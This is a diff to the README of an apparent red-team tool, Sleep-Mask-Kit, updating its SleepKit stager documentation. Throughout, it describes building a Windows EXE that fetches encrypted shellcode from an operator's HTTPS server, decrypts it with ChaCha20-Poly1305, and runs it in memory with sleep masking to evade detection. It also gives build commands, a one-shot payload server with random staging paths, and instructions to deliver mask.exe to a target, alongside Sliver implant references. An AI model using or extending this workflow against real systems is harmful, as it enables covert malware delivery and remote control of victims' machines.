@@ -324,8 +324,8 @@ After all setup:
 
 SleepKit compiles to a Windows EXE. When run on target:
 
-1. **Fetch**: WinHTTP GET request to the operator's HTTPS server; downloads `payload.enc`
-2. **Decrypt**: XOR-32 decrypt with the key baked into the binary
+1. **Fetch**: Go net/http GET request (InsecureSkipVerify; payload integrity protected by ChaCha20-Poly1305 AEAD) to the operator's HTTPS server; downloads `payload.enc`
+2. **Decrypt**: ChaCha20-Poly1305 AEAD decrypt with the key+nonce baked into the binary
 3. **Allocate**: `NtAllocateVirtualMemory(PAGE_READWRITE)` — RW allocation
 4. **Copy**: Write decrypted shellcode to the allocation
 5. **Protect**: `NtProtectVirtualMemory(PAGE_EXECUTE_READ)` — no RWX
@@ -480,9 +480,6 @@ make cli      # Go CLI only    → ./maskkit
 ```bash
 # Go 1.21+
 go version
-
-# mingw-w64 for cross-compiling mask.exe
-apt install mingw-w64
 ```
 
 ### Build Steps
@@ -642,23 +639,26 @@ cd Sleep-Mask-Kit/sleepkit
 
 ./sleepkit build \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --sleep 30s \
     --serve
 ```
 
 Output:
 ```
-[*] Shellcode: 589824 bytes
-[+] Encrypted → build/payload.enc
-[+] EXE       → build/mask.exe (cross-compiled Windows x64)
-[*] Starting payload server on https://0.0.0.0:8443/p ...
+[+] payload  → build/payload.enc
+[+] mask.exe → build/mask.exe
+[+] sleep    → 30s (30000 ms)
+[*] One-shot HTTPS server on :8443 — shuts down after one download
+[+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
+    (random path — baked into mask.exe, only this URL works)
+[i] Deliver mask.exe to target. It fetches shellcode and runs with sleep masking.
 ```
 
 **What this did**:
-- XOR-32 encrypted the shellcode with a random 32-byte key
-- Cross-compiled `mask.exe` for Windows x64 with the key and URL embedded in the binary
-- Started a one-shot HTTPS server
+- ChaCha20-Poly1305 encrypted the shellcode with a random key+nonce
+- Cross-compiled `mask.exe` for Windows x64 with the key+nonce and URL embedded in the binary
+- Started a one-shot HTTPS server with a randomly generated path baked into the EXE
 
 #### Step 4 — Deliver mask.exe to target
 
@@ -800,7 +800,7 @@ go build -o sleepkit ./cmd/sleepkit
 # Build the masked EXE + start server
 ./sleepkit build \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/p \  # full URL the EXE fetches from
+    --url https://192.168.1.10:8443 \    # scheme and host:port only; path is auto-generated when --serve is given
     --sleep 30s \                         # timer masking interval
     --serve                               # start HTTPS server
     --output build/                       # directory for mask.exe + payload.enc
@@ -808,7 +808,7 @@ go build -o sleepkit ./cmd/sleepkit
 # Build without serving
 ./sleepkit build \
     --shellcode implant.bin \
-    --url https://192.168.1.10:8443/p \
+    --url https://192.168.1.10:8443 \
     --sleep 30s
 
 # Serve an already-built payload
@@ -925,7 +925,7 @@ mask.exe (Windows process)
 
 ### MaskKit
 
-**"read bin dir: open bin: no such file or directory"**
+**"read bin dir bin: open bin: no such file or directory"**
 The C masker objects haven't been compiled. Run `make masker` first.
 
 **"parse masker.x64.o: unsupported machine type"**
@@ -949,7 +949,7 @@ The threshold may be too high for your Sliver sleep setting. If Sliver is set to
 ### SleepKit
 
 **mask.exe not found after build**
-The cross-compilation requires `x86_64-w64-mingw32-gcc`. Check: `which x86_64-w64-mingw32-gcc`. Install with `apt install mingw-w64` if missing.
+SleepKit uses pure Go cross-compilation (CGO_ENABLED=0) and does not require mingw-w64. Check that Go is in PATH: `which go` or `go version`. If Go is missing from PATH, add it or use the full path to the Go binary.
 
 **WinHTTP fetch fails on target**
 - Ensure the operator HTTPS server is reachable from the target network
